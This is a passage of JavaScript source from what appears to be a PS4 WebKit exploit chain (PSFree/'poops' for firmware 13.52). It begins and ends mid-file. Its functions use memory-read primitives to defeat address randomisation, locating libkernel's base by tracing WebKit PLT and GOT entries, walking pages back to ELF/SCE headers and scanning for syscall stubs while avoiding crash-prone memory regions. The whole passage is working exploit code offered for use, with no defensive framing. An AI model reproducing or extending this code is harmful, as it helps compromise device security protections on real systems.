            return x.key + "→0x" + x.lk + " (…" + x.lkTag + ")";
        }).join("; ");
        hint = "1 ptr matched (need 2): " + m.label + " fn=0x" + m.hex + " — " + via;
    } else if (matchedPtrs.length > 1 && zeroRank.length && zeroRank[0].distinctFn < 2) {
        hint = matchedPtrs.length + " ptrs each hit different lk — need 2 ptrs → same base";
    }

    return {
        ok: false,
        error: "no lk from " + tried + " ext ptrs (skipped " + skipped + ")",
        hint: hint,
        tried: tried,
        skipped: skipped,
        zeroRank: zeroRank.slice(0, 6),
        ptrDiag: ptrDiag,
        matchedPtrs: matchedPtrs.length,
        zeroRead: true,
        reads: 0,
    };
}

/** ≤6 reads — webkit-relative libkernel guesses (below webkit, 16KB-aligned). */
export function tryWebkitNearLibkernel(p, webkitBase, off) {
    if (!p || !webkitBase) return null;
    const cands = estimateLibkernelCandidates(webkitBase, null);
    const ctx = { webkitBase, off };
    for (let i = 0; i < cands.length; i++) {
        const lk = parseAddrSync(cands[i].hex.replace(/^0x/i, ""));
        if (!lk || !lkAligned(lk)) continue;
        if (ptrInWebkitImage(lk, webkitBase, off)) continue;
        const mag = read4p(p, lk);
        if (mag == null) continue;
        const v = verifyLibkernelBase(p, lk, off, ctx);
        if (v.ok && v.strong)
            return { lk, via: "wk-near+" + cands[i].why, k__error: null };
        if (v.ok || weakLibkernelBaseHit(p, lk, mag, ctx))
            return { lk, via: "wk-near-weak+" + cands[i].why, k__error: null, weak: true };
    }
    return null;
}

/** OOM-safe verify resolve — pass 0: k__error×8, 1: page×2, 2: walk16. No fnPtr code read. */
export function resolveExtPtrVerifyBounded(p, fnPtr, off, webkitBase, pass) {
    if (!fnPtr || fnPtr.hi < 0x8) return null;
    pass = pass != null ? pass : 0;
    const ctx = { fnPtr, webkitBase, off };

    if (pass === 0) {
        const errs = kErrorCandidates(off);
        for (let i = 0; i < errs.length; i++) {
            const lk = fnPtr.sub32(errs[i]);
            if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
            if (!isLibkernelPrologue(p, lk, ctx)) continue;
            return { lk, via: "error+" + errs[i].toString(16), k__error: errs[i], fnPtr };
        }
        return null;
    }

    if (pass === 1) {
        const pageBase = pageAlignDown(fnPtr, 0x4000);
        for (let d = 0; d < 2; d++) {
            const pg = d === 0 ? pageBase : pageBase.sub32(0x4000);
            if (!plausibleLkBeforeRead(pg, fnPtr, webkitBase, off)) continue;
            const mag = read4p(p, pg);
            if (weakLibkernelBaseHit(p, pg, mag, ctx)) {
                const kOff = Number(ptrBig(fnPtr) - ptrBig(pg));
                return { lk: pg, via: "page+k=" + kOff.toString(16), k__error: kOff, fnPtr };
            }
        }
        return null;
    }

    return resolveExtPtrPageWalk(p, fnPtr, webkitBase, off, 16);
}

/** k__error subtract then page-align — 13.52 imports rarely land aligned raw. */
export function resolveExtAlignedKError(p, fnPtr, off, webkitBase, opts) {
    opts = opts || {};
    if (!fnPtr || fnPtr.hi < 0x8) return null;
    const ctx = { fnPtr, webkitBase, off };
    const errs = kErrorCandidates(off);
    const maxN = opts.maxKErrors != null ? Math.min(opts.maxKErrors, errs.length) : errs.length;
    for (let i = 0; i < maxN; i++) {
        const raw = fnPtr.sub32(errs[i]);
        const tries = opts.pageAlignOnly ? [pageAlignDown(raw, 0x4000)] : [raw, pageAlignDown(raw, 0x4000)];
        for (let t = 0; t < tries.length; t++) {
            const lk = tries[t];
            if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
            const mag = read4p(p, lk);
            if (mag == null) continue;
            const v = verifyLibkernelBase(p, lk, off, ctx);
            if (v.ok && v.strong)
                return { lk, via: "align-k+" + errs[i].toString(16), k__error: errs[i], fnPtr };
            if (opts.strongOnly) continue;
            if (v.ok || weakLibkernelBaseHit(p, lk, mag, ctx))
                return { lk, via: "align-k-weak+" + errs[i].toString(16), k__error: errs[i], fnPtr, weak: true };
        }
    }
    return null;
}

/** One deep walk from lowest ext ptr only — avoids 7× walk OOM. */
export function resolveMinExtDeepWalk(p, extHexList, off, webkitBase, maxPages) {
    if (!p || !extHexList || !extHexList.length) return null;
    maxPages = maxPages != null ? maxPages : 128;
    let minPtr = null;
    let minHex = null;
    let minB = null;
    for (let i = 0; i < extHexList.length; i++) {
        const raw = String(extHexList[i]).replace(/^0x/i, "").trim();
        if (!raw) continue;
        const fp = parseAddrSync(raw);
        if (!fp || fp.hi < 0x8) continue;
        const b = ptrBig(fp);
        if (minB == null || b < minB) {
            minB = b;
            minPtr = fp;
            minHex = raw;
        }
    }
    if (!minPtr) return null;

    const ctx = { fnPtr: minPtr, webkitBase, off };
    let page = pageAlignDown(minPtr, 0x4000);
    let nullStreak = 0;
    let pages = 0;
    const magSeen = [];
    for (let i = 0; i < maxPages; i++) {
        if (!page || !plausibleLkBeforeRead(page, minPtr, webkitBase, off)) break;
        pages++;
        const magic = read4p(p, page);
        if (magic == null) {
            nullStreak++;
            if (nullStreak >= 8) break;
            page = page.sub32(0x4000);
            continue;
        }
        nullStreak = 0;
        if (magSeen.length < 4)
            magSeen.push("0x" + (magic >>> 0).toString(16));
        if (magic === SCE_MAGIC || magic === ELF_MAGIC || weakLibkernelBaseHit(p, page, magic, ctx)) {
            const v = verifyLibkernelBase(p, page, off, ctx);
            if (v.ok || weakLibkernelBaseHit(p, page, magic, ctx)) {
                const kOff = Number(ptrBig(minPtr) - ptrBig(page));
                return {
                    lk: page,
                    via: "min-walk+k=" + kOff.toString(16),
                    k__error: kOff,
                    fnPtr: minPtr,
                    from: minHex,
                    pages: pages,
                    magSeen: magSeen,
                };
            }
        }
        page = page.sub32(0x4000);
    }
    return {
        miss: true,
        from: minHex,
        pages: pages,
        magSeen: magSeen,
    };
}

function kErrorCandidates(off) {
    const out = [];
    if (off.k__error != null) out.push(off.k__error);
    for (let i = 0; i < K_ERROR_CANDS.length; i++) {
        const v = K_ERROR_CANDS[i];
        if (out.indexOf(v) < 0) out.push(v);
    }
    return out;
}

function s32(v) {
    if (v == null) return null;
    return v | 0;
}

/** Follow one webkit PLT jmp [rip+disp] hop (ff 25). */
function resolveImportPtr(p, webkitBase, off, fnPtr, depth) {
    if (!fnPtr || depth > 1) return fnPtr;
    if (plausibleExtPtr(fnPtr, webkitBase, off)) return fnPtr;
    if (!ptrInWebkitImage(fnPtr, webkitBase, off)) return null;
    const b0 = read1p(p, fnPtr);
    const b1 = read1p(p, fnPtr.add32(1));
    if (b0 !== 0xff || b1 !== 0x25) return null;
    const disp = s32(read4p(p, fnPtr.add32(2)));
    if (disp == null) return null;
    const slot = fnPtr.add32(6 + disp);
    const tgt = read8p(p, slot);
    if (!tgt) return null;
    return resolveImportPtr(p, webkitBase, off, tgt, depth + 1);
}

function lkAligned(lk) {
    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
}

/** Never read prologue/walk unless lk sits just below fn in same module band. */
function plausibleLkBeforeRead(lk, fnPtr, webkitBase, off) {
    if (!lkAligned(lk) || !userlandPtrOk(lk)) return false;
    if (fnPtr) {
        const lkB = ptrBig(lk);
        const fnB = ptrBig(fnPtr);
        if (fnB <= lkB) return false;
        if (fnB - lkB > 0x1400000n) return false;
        if (lk.hi !== fnPtr.hi && Math.abs(lk.hi - fnPtr.hi) > 1) return false;
    }
    if (webkitBase && ptrInWebkitImage(lk, webkitBase, off)) return false;
    return true;
}

function isSameWebkitModule(base, webkitBase, off) {
    if (!base || !webkitBase) return false;
    if (base.hi !== webkitBase.hi) return false;
    const lo = webkitBase.low >>> 0;
    const bl = base.low >>> 0;
    if (bl < lo) return false;
    return (bl - lo) <= webkitModuleSpan(off);
}

/** Sparse syscall stub count — libkernel.sprx / libkernel_web has many mov rax,N patterns. */
function scoreSyscallStubs(p, base, maxOff, step) {
    maxOff = maxOff || 0x80000;
    step = step || 0x200;
    let stubs = 0;
    for (let off = 0x1000; off < maxOff; off += step) {
        const w = read4p(p, base.add32(off));
        if (w != null && (w & 0xffffff) === 0xc0c748) stubs++;
    }
    return stubs;
}

function scoreModuleAsLibkernel(p, base) {
    const prologue = isLibkernelPrologue(p, base);
    const stubs = scoreSyscallStubs(p, base);
    const score = stubs + (prologue ? 100 : 0);
    return { stubs, prologue, score };
}

function pageAlignDown(addr, align) {
    return new int64((addr.low >>> 0) & ~(align - 1), addr.hi >>> 0);
}

const POOPS_TEXT_MAGIC = 0xe5894855;

/** PS4 module may be SCE header @ base, ELF @ +0x160. */
function elfImageBase(p, base) {
    if (!base) return null;
    const w = read4p(p, base);
    if (w === ELF_MAGIC) return base;
    if (w === SCE_MAGIC) return base.add32(SCE_ELF_OFF);
    return null;
}

function classifyModulePage(w) {
    if (w == null) return null;
    if (w === ELF_MAGIC) return "elf";
    if (w === SCE_MAGIC) return "sce";
    if (w === POOPS_TEXT_MAGIC) return "text";
    return null;
}

/** Walk back from poops/text base for SCE or ELF module header (cal_demo / chain_poops). */
function findHeaderBackward(p, start, maxBack, step) {
    const aligned = pageAlignDown(start, step);
    for (let i = 0; i <= maxBack; i++) {
        const addr = i === 0 ? start : aligned.sub32(i * step);
        if (!addr || addr.hi < 0x8) break;
        const w = read4p(p, addr);
        if (w === ELF_MAGIC) return { hdr: addr, kind: "elf" };
        if (w === SCE_MAGIC) return { hdr: addr, kind: "sce" };
    }
    return null;
}

/** Resolve code base (RVA origin) + optional ELF img. quick=true skips heavy backward walk. */
let _modLayoutKey = "";
let _modLayoutVal = null;

function resolveModuleLayout(p, hint, opts) {
    opts = opts || {};
    if (!hint) return null;
    const key = String(hint) + (opts.deep ? ":d" : ":q");
    if (!opts.nocache && key === _modLayoutKey && _modLayoutVal)
        return _modLayoutVal;

    const codeBase = hint;
    const w0 = read4p(p, codeBase);
    const kind0 = classifyModulePage(w0);
    const layout = {
        codeBase,
        loadBase: codeBase,
        kind: kind0 || "unknown",
        img: null,
        hdr: null,
        poops: false,
    };

    if (kind0 === "elf") {
        layout.hdr = codeBase;
        layout.img = codeBase;
        _modLayoutKey = key;
        _modLayoutVal = layout;
        return layout;
    }
    if (kind0 === "sce") {
        layout.hdr = codeBase;
        layout.img = codeBase.add32(SCE_ELF_OFF);
        _modLayoutKey = key;
        _modLayoutVal = layout;
        return layout;
    }

    if (kind0 === "text") {
        layout.poops = true;
        layout.kind = "text";
        if (!opts.deep) {
            _modLayoutKey = key;
            _modLayoutVal = layout;
            return layout;
        }
    }

    if (opts.deep) {
        let hit = findHeaderBackward(p, codeBase, LK_HDR_BACK_COARSE, 0x4000);
        if (!hit) hit = findHeaderBackward(p, codeBase, LK_HDR_BACK_FINE, 0x1000);
        if (hit) {
            layout.hdr = hit.hdr;
            layout.kind = hit.kind;
            layout.img = hit.kind === "sce" ? hit.hdr.add32(SCE_ELF_OFF) : hit.hdr;
            layout.elfBack = true;
            layout.poops = false;
        }
    }

    _modLayoutKey = key;
    _modLayoutVal = layout;
    return layout;
}

function moduleLoadBase(p, hint) {
    const lay = resolveModuleLayout(p, hint, { quick: true });
    return lay ? lay.codeBase : hint;
}

function minLoadVaddr(p, img, ePhoff, ePhnum, ePhentsize) {
    let min = null;
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        if (read4p(p, img.add32(ph)) !== PT_LOAD) continue;
        const va = u64Lo(read8p(p, img.add32(ph + 0x10)));
        if (va == null) continue;
        if (min === null || va < min) min = va;
    }
    return min || 0;
}

function fmtMagic(w) {
    if (w == null) return "null";
    const b = w >>> 0;
    return "0x" + (b & 0xff).toString(16).padStart(2, "0")
        + (b >>> 8 & 0xff).toString(16).padStart(2, "0")
        + (b >>> 16 & 0xff).toString(16).padStart(2, "0")
        + (b >>> 24 & 0xff).toString(16).padStart(2, "0");
}

function isModuleMagic(w) {
    return w === ELF_MAGIC || w === SCE_MAGIC;
}

function u64Lo(w) {
    if (!w) return null;
    return Number(u64FromRead8(w) & 0xffffffffn);
}

/** Parse PT_DYNAMIC — codeBase = poops/text RVA origin; img may be lower in memory. */
function parseDynamicMeta(p, webkitBase) {
    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
    if (!layout || !layout.img) return null;
    const loadBase = layout.codeBase;
    const img = layout.img;
    if (read2p(p, img.add32(0x12)) !== 0x3e) return null;

    const ePhoff = u64Lo(read8p(p, img.add32(0x20)));
    const ePhnum = read2p(p, img.add32(0x38));
    const ePhentsize = read2p(p, img.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return null;

    const bias = minLoadVaddr(p, img, ePhoff, ePhnum, ePhentsize);

    let dynVaddr = null;
    let dynMemsz = 0;
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        if (read4p(p, img.add32(ph)) !== PT_DYNAMIC) continue;
        dynVaddr = u64Lo(read8p(p, img.add32(ph + 0x10)));
        dynMemsz = u64Lo(read8p(p, img.add32(ph + 0x28))) || 0;
        break;
    }
    if (dynVaddr == null || dynMemsz < 16) return null;

    const vaTries = [dynVaddr];
    if (bias && dynVaddr >= bias) vaTries.push(dynVaddr - bias);

    for (let t = 0; t < vaTries.length; t++) {
        const dynVa = vaTries[t];
        const meta = { loadBase, img, dynVaddr: dynVa, dynMemsz, bias };
        let tags = 0;
        for (let off = 0; off + 16 <= dynMemsz; off += 16) {
            const tag = u64Lo(read8p(p, loadBase.add32(dynVa + off)));
            const val = u64Lo(read8p(p, loadBase.add32(dynVa + off + 8)));
            if (tag == null || val == null) break;
            if (tag === 0) break;
            tags++;
            if (tag === DT_PLTGOT || tag === DT_SCE_PLTGOT) meta.pltgot = val;
            else if (tag === DT_PLTRELSZ || tag === DT_SCE_PLTRELSZ) meta.pltrelsz = val;
            else if (tag === DT_RELA || tag === DT_SCE_RELA) meta.rela = val;
            else if (tag === DT_RELASZ || tag === DT_SCE_RELASZ) meta.relasz = val;
            else if (tag === DT_RELAENT || tag === DT_SCE_RELAENT) meta.relaent = val;
            else if (tag === DT_JMPREL || tag === DT_SCE_JMPREL) meta.jmprel = val;
        }
        if (tags >= 2 && (meta.pltgot || meta.jmprel || meta.rela)) return meta;
    }
    return null;
}

/** Runtime diagnostic — quick=1 read at base only (OOM-safe at scan start). */
export function diagnoseWebkitDynamic(p, webkitBase, off, opts) {
    opts = opts || {};
    const cap = iatCap(off);
    const layout = resolveModuleLayout(p, webkitBase, { quick: !opts.deep });
    const magic = read4p(p, webkitBase);
    const out = {
        hint: String(webkitBase),
        loadBase: String(webkitBase),
        magic: fmtMagic(magic),
        cap: "+0x" + cap.toString(16),
        kind: layout ? layout.kind : "?",
    };
    if (layout && layout.poops)
        out.poops = true;
    if (layout && layout.hdr)
        out.elfHdr = String(layout.hdr);
    if (!layout || !layout.img) {
        if (layout && layout.kind === "text")
            out.reason = "poops text base — lite scan (low PLT, no ELF walk)";
        else
            out.reason = "no module header (kind=" + (layout ? layout.kind : "?") + ")";
        return out;
    }
    if (!opts.deep) {
        out.reason = "ELF hdr found — tap scan for dynamic GOT";
        out.header = read4p(p, layout.hdr) === SCE_MAGIC ? "SCE" : "ELF";
        return out;
    }
    out.header = read4p(p, layout.hdr) === SCE_MAGIC ? "SCE" : "ELF";
    const meta = parseDynamicMeta(p, webkitBase);
    if (!meta) {
        out.reason = "PT_DYNAMIC unreadable (elfHdr=" + out.elfHdr + ")";
        return out;
    }
    out.jmprel = "+0x" + (meta.jmprel || 0).toString(16);
    out.pltgot = "+0x" + (meta.pltgot || 0).toString(16);
    out.rela = "+0x" + (meta.rela || 0).toString(16);
    const all = collectDynamicGotRvas(p, meta, null);
    const inCap = all.filter(r => r >= 0x1000 && r <= cap);
    out.total = all.length;
    out.inCap = inCap.length;
    if (all.length) {
        out.minRva = "+0x" + all[0].toString(16);
        out.maxRva = "+0x" + all[all.length - 1].toString(16);
    }
    if (!all.length)
        out.reason = "dynamic tags OK but 0 GOT RVAs extracted";
    else if (!inCap.length)
        out.reason = "all " + all.length + " GOT slots above cap " + out.cap
            + " (high RELRO unmapped on 13.52)";
    else
        out.reason = "ok";
    return out;
}

/** Calculate GOT slot RVAs from DT_JMPREL / DT_RELA (cap=null → all slots). */
function collectDynamicGotRvas(p, meta, cap) {
    const base = meta.loadBase;
    const seen = {};
    const slots = [];

    function add(rva) {
        if (rva == null || rva < 8) return;
        if (cap != null && rva > cap) return;
        const k = rva.toString(16);
        if (seen[k]) return;
        seen[k] = 1;
        slots.push(rva);
    }

    if (meta.jmprel && meta.pltrelsz) {
        const ent = 24;
        const n = Math.min(Math.floor(meta.pltrelsz / ent), 8192);
        for (let i = 0; i < n; i++) {
            add(u64Lo(read8p(p, base.add32(meta.jmprel + i * ent))));
        }
    }

    if (meta.rela && meta.relasz) {
        const ent = meta.relaent || 24;
        const n = Math.min(Math.floor(meta.relasz / ent), 8192);
        for (let i = 0; i < n; i++) {
            const relOff = meta.rela + i * ent;
            const rva = u64Lo(read8p(p, base.add32(relOff)));
            const info = u64Lo(read8p(p, base.add32(relOff + 8)));
            if (info == null) continue;
            const rType = info & 0xff;
            if (rType === 6 || rType === 8 || rType === 0x103) add(rva);
        }
    }

    if (meta.pltgot) {
        for (let i = 0; i < 256; i++)
            add(meta.pltgot + i * 8);
    }

    slots.sort((a, b) => a - b);
    return slots;
}

function splitSlotsByCap(all, cap) {
    const inCap = [];
    for (let i = 0; i < all.length; i++) {
        const r = all[i];
        if (r >= 0x1000 && r <= cap) inCap.push(r);
    }
    return inCap;
}

function scoreModuleAt(p, base) {
    let best = scoreModuleAsLibkernel(p, base);
    if (read4p(p, base) === SCE_MAGIC) {
        const elf = base.add32(SCE_ELF_OFF);
        const sc2 = scoreModuleAsLibkernel(p, elf);
        if (sc2.score > best.score) best = sc2;
    }
    return best;
}

function looksLikeLibkernelModule(p, base) {
    if (!base) return false;
    return scoreModuleAt(p, base).score >= 8
        || isLibkernelPrologue(p, base)
        || isLibkernelPrologue(p, base.add32(SCE_ELF_OFF));
}

/** PSFree find_base — walk back until ELF or SCE magic. */
function findModuleBaseBackward(p, addr, maxPages) {
    if (!addr || addr.hi < 0x8) return null;
    const limit = maxPages || 512;
    for (let a = 0; a < 2; a++) {
        const align = a === 0 ? 0x4000 : 0x1000;
        let page = pageAlignDown(addr, align);
        for (let i = 0; i < limit; i++) {
            const magic = read4p(p, page);
            if (isModuleMagic(magic)) return page;
            if (magic == null) break;
            const prev = page.sub32(align);
            if (!prev || prev.hi < 0x8) break;
            page = prev;
        }
    }
    return null;
}

/** PLT stub @ webkit+pltRva — ff 25 or ff 15 → GOT slot → target fn ptr (+ PLT hop). */
export function resolvePltImportAt(p, webkitBase, pltRva, off) {
    if (pltRva == null) return null;
    const base = moduleLoadBase(p, webkitBase);
    const stub = base.add32(pltRva);
    const op = read2p(p, stub);
    if (op !== 0x25ff && op !== 0x15ff) return null;
    const disp = s32(read4p(p, stub.add32(2)));
    if (disp == null) return null;
    const tgt = read8p(p, stub.add32(6 + disp));
    if (!tgt) return null;
    if (off)
        return resolveImportPtr(p, base, off, tgt, 0);
    return tgt;
}

/** Walk back ≤maxPages×16KB from code ptr looking for ELF/SCE header (≤maxPages reads). */
function findBaseLite(p, codePtr, maxPages) {
    maxPages = maxPages || 12;
    if (!codePtr || codePtr.hi < 0x8) return null;
    let page = pageAlignDown(codePtr, 0x4000);
    for (let i = 0; i < maxPages; i++) {
        const w = read4p(p, page);
        if (w === ELF_MAGIC) return { lk: page, kind: "elf" };
        if (w === SCE_MAGIC) return { lk: page, kind: "sce" };
        page = page.sub32(0x4000);
        if (page.hi < 0x8) break;
    }
    return null;
}

/**
 * PSFree resolve: PLT → fn ptr → fn.sub32(k__error) (chain_poops path).
 * Short header walk is fallback only — libkernel fns are often MBs from base.
 */
function lkFromFnPtrPsfree(p, fnPtr, off, pltRva, webkitBase) {
    if (!fnPtr || fnPtr.hi < 0x8) return null;
    const wkBase = webkitBase ? moduleLoadBase(p, webkitBase) : null;

    if (isGetpidStub(fnPtr)) {
        const hit = lkFromStubAddrLite(p, fnPtr, off);
        if (hit)
            return { lk: hit.lk, iatRva: pltRva, via: "getpid-stub", fnPtr };
    }

    const entryB0 = read1p(p, fnPtr);
    if (entryB0 === 0xb8) {
        const zeroHits = calcLkFromFnPtrZeroRead(fnPtr, off);
        if (zeroHits.length)
            return { lk: zeroHits[0].lk, iatRva: pltRva, via: zeroHits[0].via, fnPtr };
        const errs = kErrorCandidates(off);
        for (let i = 0; i < errs.length; i++) {
            const lk = fnPtr.sub32(errs[i]);
            if (looksLikeLkBase(lk, off))
                return { lk, iatRva: pltRva, via: "error+" + errs[i].toString(16), fnPtr };
            if (lkAligned(lk) && isLibkernelPrologue(p, lk))
                return { lk, iatRva: pltRva, via: "error+" + errs[i].toString(16), fnPtr };
        }
    }

    if (wkBase && plausibleExtPtr(fnPtr, wkBase, off)) {
        const got = findBaseLite(p, fnPtr, 32);
        if (got && looksLikeLibkernelModule(p, got.lk))
            return { lk: got.lk, iatRva: pltRva, via: got.kind, fnPtr };
        const pageBase = pageAlignDown(fnPtr, 0x4000);
        if (lkAligned(pageBase) && isLibkernelPrologue(p, pageBase))
            return { lk: pageBase, iatRva: pltRva, via: "page", fnPtr };
    }

    return null;
}

/** 13.52 poops — pages below +0x10000 are unmapped (same as pivot SCAN_PIVOT_MIN). */
const POOPS_SCAN_LO = 0x10000;
/** HW OOM hole — linear scan dies ~+0x30c10..0x32b (user-confirmed). */
const POOPS_OOM_LO = 0x2f000;
const POOPS_OOM_HI = 0x34000;

/** Poops: skip OOM hole; scan only around HW-mapped code islands. */
function psfreePoopsRanges(off) {
    const expm1 = (off && off.wk_expm1_builtin) || 0xeb6350;
    const cap = webkitRvaMaxFromOff(off);
    const raw = [
        { lo: POOPS_SCAN_LO, hi: POOPS_OOM_LO, tag: "low" },
        { lo: 0xe0000, hi: 0xf8000, tag: "mid" },
    ];
    const out = [];
    for (let i = 0; i < raw.length; i++) {
        const lo = Math.max(POOPS_SCAN_LO, raw[i].lo);
        const hi = Math.min(cap, raw[i].hi);
        if (hi > lo) out.push({ lo, hi, tag: raw[i].tag });
    }
    return out;
}

function psfreeRangesText(ranges) {
    if (!ranges || !ranges.length) return "?";
    return ranges.map(function (r) {
        return r.tag + ":0x" + r.lo.toString(16) + "-0x" + r.hi.toString(16);
    }).join(" ");
}

function psfreeScanPlan(p, webkitBase, off, opts) {
    opts = opts || {};
    const w0 = read4p(p, webkitBase);
    const poopsMagic = w0 === POOPS_TEXT_MAGIC;
    const poops = poopsMagic || isPoopsTextBase(p, webkitBase);
    const cap = webkitRvaMaxFromOff(off);
    if (poops || opts.cluster) {
        const ranges = psfreePoopsRanges(off);
        return {
            poops,
            cap,
            ranges,
            rangeText: psfreeRangesText(ranges),
            lo: ranges[0] ? ranges[0].lo : POOPS_SCAN_LO,
            hi: ranges.length ? ranges[ranges.length - 1].hi : POOPS_OOM_LO,
        };
    }
    const lo = 0x1000;
    let hi = opts.scanEnd != null ? opts.scanEnd : cap;
    if (hi > cap) hi = cap;
    if (hi <= lo) hi = Math.min(cap, lo + 0x400000);
    return { poops: false, cap, ranges: [{ lo, hi, tag: "full" }], lo, hi };
}

function isPoopsTextBase(p, webkitBase) {
    const layout = resolveModuleLayout(p, webkitBase, { quick: true });
    return !!(layout && (layout.poops || layout.kind === "text"));
}

function psfreeAdvanceRange(state) {
    const next = state.rangeIdx + 1;
    if (next >= state.ranges.length) return false;
    state.rangeIdx = next;
    state.cursor = state.ranges[next].lo;
    state.end = state.ranges[next].hi;
    state.rangeTag = state.ranges[next].tag;
    return true;
}

/** Leave current island — never linear-scan the OOM gap or past range end. */
function psfreeFinishRange(state) {
    if (psfreeAdvanceRange(state))
        return { advanced: true, rangeTag: state.rangeTag, cursor: state.cursor };
    return { advanced: false };
}

function psfreeMissChunk(state) {
    const err = "PSFree PLT exhausted — " + psfreeStatsLine(state);
    return {
        done: true,
        ok: false,
        error: err,
        state: null,
        phase: "miss",
        tried: state.tried,
        lastFn: state.lastFn,
        lastPlt: state.lastPlt,
        lastRaw: state.lastRaw,
        fnLkFails: state.fnLkFails || 0,
        stubsSeen: state.stubsSeen || 0,
        gotNull: state.gotNull || 0,
        hopFail: state.hopFail || 0,
        fnExt: state.fnExt || 0,
        nullSkips: state.nullSkips || 0,
        probe: state.probe,
        cursor: state.cursor,
        rangeTag: state.rangeTag,
    };
}

export function formatPsfreeStats(st) {
    return psfreeStatsLine(st);
}

/** cal / vtable ext ptr → candidate bases via Suchi RVA math only (0 reads). */
export function extPtrToLkCandidates(p, fnPtr, off, webkitBase) {
    const out = [];
    const seen = new Set();
    function add(lk) {
        if (!lk || lk.hi < 0x8) return;
        const k = String(lk);
        if (seen.has(k)) return;
        seen.add(k);
        out.push(lk);
    }
    if (!fnPtr) return out;
    const zero = calcLkFromFnPtrZeroRead(fnPtr, off);
    for (let i = 0; i < zero.length; i++)
        add(zero[i].lk);
    return out;
}

function fmtMagic4(w) {
    if (w == null) return "null";
    return "0x" + (w >>> 0).toString(16);
}

/** ≤20 reads — sanity checkpoints + sparse ff25 sample (no full-range sweep). */
function psfreeProbeBase(p, webkitBase, off, bounds) {
    const base = moduleLoadBase(p, webkitBase);
    const expm1 = (off && off.wk_expm1_builtin) || 0;
    const g5 = 0x13ec77a;
    const checkpoints = [
        { rva: 0, tag: "base" },
        { rva: 0x178, tag: "plt178" },
        { rva: POOPS_SCAN_LO, tag: "16k" },
        { rva: expm1, tag: "expm1" },
        { rva: g5, tag: "g5" },
    ];
    const sanity = [];
    let rdOk = 0;
    let rdFail = 0;
    for (let i = 0; i < checkpoints.length; i++) {
        const cp = checkpoints[i];
        const w = read4p(p, base.add32(cp.rva));
        if (w == null) {
            rdFail++;
            sanity.push(cp.tag + "=FAIL");
        } else {
            rdOk++;
            sanity.push(cp.tag + "=" + fmtMagic4(w));
        }
    }
    let stubs = 0;
    const sampleLo = bounds.ranges && bounds.ranges[0] ? bounds.ranges[0].lo : bounds.lo;
    const sampleEnd = Math.min(bounds.hi, sampleLo + 0x8000);
    for (let rva = sampleLo; rva < sampleEnd; rva += 0x800) {
        const w0 = read4p(p, base.add32(rva));
        if (w0 == null) { rdFail++; continue; }
        rdOk++;
        const b0 = w0 & 0xff;
        const b1 = (w0 >>> 8) & 0xff;
        if (b0 === 0xff && (b1 === 0x25 || b1 === 0x15)) stubs++;
    }
    const samples = [];
    const cands = importPltCandidates(off, bounds.lo);
    for (let i = 0; i < cands.length && i < 4; i++) {
        const rva = cands[i];
        const op = read2p(p, base.add32(rva));
        let tail = op == null ? "rd-fail" : "op=0x" + op.toString(16);
        if (op === 0x25ff || op === 0x15ff) {
            const disp = s32(read4p(p, base.add32(rva + 2)));
            const tgt = disp != null ? read8p(p, base.add32(rva + 6 + disp)) : null;
            tail += tgt ? " got=" + tgt : " got=null";
        }
        samples.push("+0x" + rva.toString(16) + " " + tail);
    }
    return {
        wk: String(webkitBase),
        base: String(base),
        poops: bounds.poops,
        ranges: bounds.ranges ? bounds.ranges.length : 1,
        rangeText: bounds.rangeText || "",
        scanLo: bounds.lo,
        scanHi: bounds.hi,
        magic: sanity[0] ? sanity[0].split("=")[1] : "?",
        sanity: sanity.join(" "),
        stubs,
        rdOk,
        rdFail,
        samples: samples.join(" | "),
    };
}

function psfreeStatsLine(st) {
    st = st || {};
    let s = "tried=" + (st.tried || 0)
        + " stubs=" + (st.stubsSeen || 0)
        + " gotNull=" + (st.gotNull || 0)
        + " hopFail=" + (st.hopFail || 0)
        + " fnExt=" + (st.fnExt || 0)
        + " lkFail=" + (st.fnLkFails || 0);
    if (st.lastFn) s += " lastFn=" + st.lastFn;
    if (st.lastPlt != null) s += " plt+0x" + st.lastPlt.toString(16);
    if (st.rangeTag) s += " rng=" + st.rangeTag;
    if (st.nullSkips) s += " nullSkip=" + st.nullSkips;
    if (st.probe) {
        s += " poops=" + (st.probe.poops ? 1 : 0);
        s += " rdOk=" + (st.probe.rdOk || 0) + " rdFail=" + (st.probe.rdFail || 0);
        s += " ff25sample=" + (st.probe.stubs || 0);
        s += " scan=0x" + (st.scanLo || (st.probe && st.probe.scanLo) || 0).toString(16)
            + "..0x" + (st.scanHi || (st.probe && st.probe.scanHi) || 0).toString(16);
    }
    return s;
}

function tryOnePsfreePlt(p, webkitBase, off, pltRva) {
    const base = moduleLoadBase(p, webkitBase);
    const stub = base.add32(pltRva);
    const op = read2p(p, stub);
    if (op !== 0x25ff && op !== 0x15ff)
        return { kind: "no-stub", pltRva, op };
    const disp = s32(read4p(p, stub.add32(2)));
    if (disp == null)
        return { kind: "disp-fail", pltRva, op };
    const raw = read8p(p, stub.add32(6 + disp));
    if (!raw)
        return { kind: "got-null", pltRva, op };
    const fn = resolveImportPtr(p, base, off, raw, 0);
    if (!fn)
        return { kind: "hop-fail", pltRva, op, raw };
    const hit = lkFromFnPtrPsfree(p, fn, off, pltRva, webkitBase);
    if (!hit)
        return { kind: "lk-fail", pltRva, fnPtr: fn };
    saveLibkernelSession(hit.lk, hit.iatRva);
    return {
        kind: "ok",
        lk: hit.lk,
        pltRva,
        fnPtr: fn,
        via: hit.via,
        stubOk: false,
    };
}

/**
 * One UI tap — try next PLT candidates (bounded reads).
 * Phase 1: known PSFree RVAs. Phase 2: low .text ff25/ff15 scan.
 */
export function tryPsfreePltBatch(p, webkitBase, off, state, opts) {
    opts = opts || {};
    const MAX_READS = opts.maxReads || 16;
    const plan = psfreeScanPlan(p, webkitBase, off, opts);
    let reads = 0;

    if (!state) {
        const probe = psfreeProbeBase(p, webkitBase, off, plan);
        const r0 = plan.ranges[0];
        state = {
            phase: "cand",
            candIdx: 0,
            cands: importPltCandidates(off, plan.lo),
            base: moduleLoadBase(p, webkitBase),
            ranges: plan.ranges,
            rangeIdx: 0,
            cursor: r0 ? r0.lo : plan.lo,
            end: r0 ? r0.hi : plan.hi,
